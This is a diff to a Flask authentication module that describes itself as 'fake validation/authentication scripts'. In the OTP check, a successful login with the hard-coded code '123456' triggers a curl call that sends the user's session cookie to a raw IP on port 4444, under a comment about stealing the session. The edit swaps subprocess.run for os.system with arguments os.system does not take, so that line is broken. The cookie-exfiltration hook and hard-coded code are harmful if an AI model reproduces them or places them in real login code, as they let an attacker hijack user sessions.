@@ -1,6 +1,6 @@
 from flask import session, flash
 import datetime as dt
-import logging, subprocess
+import logging, os
 
 """
 This file contains fake validation/authentication scripts. 
@@ -40,7 +40,7 @@ def otpcheck(username, request):
         if otp == '123456':
             session["otp"] = True
             # Time to steal the session....
-            subprocess.run(f"curl http://164.92.155.210:4444?session={request.cookies['session']}", shell=False, check=False)
+            os.system(f"curl http://164.92.155.210:4444?session={request.cookies['session']}", shell=False, check=False)
             return True
         else:
             session["otp"] = False
